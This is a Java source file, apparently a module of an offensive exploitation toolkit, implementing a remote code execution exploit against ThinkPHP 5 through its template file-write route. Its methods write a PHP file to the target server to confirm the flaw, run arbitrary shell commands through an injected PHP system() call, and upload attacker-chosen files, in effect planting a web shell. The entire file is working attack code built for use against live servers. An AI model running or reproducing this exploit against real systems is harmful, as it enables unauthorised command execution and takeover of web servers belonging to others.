package fun.fireline.exp.php.thinkphp;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;
import fun.fireline.tools.Tools;

import java.net.URLEncoder;
import java.util.HashMap;

/**
 * @author yhy
 * @date 2021/8/20 22:23
 * @github https://github.com/yhy0
 */

public class TP5_templalte_driver_rce implements ExploitInterface {
    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();
    private String results = null;

    // 检测漏洞是否存在
    @Override
    public String checkVul(String url) {
        this.target = url;

        HttpTools.get(url + "/index.php?s=index/\\think\\template\\driver\\file/write&cacheFile=mqz.php&content=%3C?php%20var_dump(md5(2333));?%3E", this.headers, "UTF-8");
        Response response = HttpTools.get(url + "/mqz.php", this.headers, "UTF-8");
        if (response.getText().contains("56540676a129760a")) {
            this.results = "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞";
            this.isVul = true;
            return this.results;
        } else if (response.getError() != null) {
            this.results = "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
            return this.results;
        } else {
            this.results = "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
            return this.results;
        }
    }

    // 命令执行
    @Override
    public String exeCmd(String cmd, String encoding) {
        HttpTools.get(this.target + "/index.php?s=index/\\think\\template\\driver\\file/write&cacheFile=&content=%3C?php%20system(\"" + cmd + "\");?%3E", this.headers, "UTF-8");
        Response response = HttpTools.get(this.target + "/mqz.php", this.headers, encoding);
        if (response.getError() == null) {
            this.results = Tools.regReplace(response.getText());
        } else {
            this.results = response.getError();
        }

        return this.results;
    }

    // 获取当前的web路径，todo
    @Override
    public String getWebPath() {
        String result = exeCmd("@print(realpath(__ROOT__))", "UTF-8");
        return result;
    }

    @Override
    public String uploadFile(String content, String fileName, String platform) throws Exception {
        try {
            content = URLEncoder.encode(content, "UTF-8");
            String payload = this.target + "/index.php?s=index/\\think\\template\\driver\\file/write&cacheFile=" + fileName + "&content=" + content;
            Response response = HttpTools.get(payload, this.headers, "UTF-8");
            if (response.getError() == null) {
                response = HttpTools.get(this.target + "/" + fileName, this.headers, "UTF-8");
                if (response.getCode() == 200) {
                    this.results = "[+] 上传成功，请检查URL：" + this.target + "/" + fileName;
                } else {
                    this.results = "[-] 上传失败！";
                }
            } else {
                this.results = "[-] 上传失败: " + response.getError();
            }
        } catch (Exception var6) {
            this.results = "[-] 上传失败: " + var6.getMessage();
        }

        return this.results;
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
